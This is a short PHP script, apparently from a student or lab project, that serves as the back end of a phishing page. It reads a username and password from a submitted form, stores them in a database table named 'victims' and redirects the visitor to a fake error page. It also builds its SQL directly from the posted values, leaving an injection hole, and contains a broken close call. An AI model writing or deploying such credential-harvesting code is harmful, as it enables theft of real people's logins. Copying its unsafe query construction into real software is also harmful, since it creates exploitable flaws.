<?php
    $dbconection = pg_connect("host=192.168.100.193 port=25000 dbname=DB_Proyecto user=DB_Proyecto password=DB_Proyecto");       

    $id = 0;
    $usuario = $_POST["user"];
    $contrasena = $_POST["pass"];

    $id = $id + 1 ;
    $query = ("INSERT INTO victims (Id, Username, Password) VALUES ($id, $usuario, $contrasena)");

    $registro = pg_query($dbconection, $query);

    pg.close();

    header('Location:error.html');
?>    
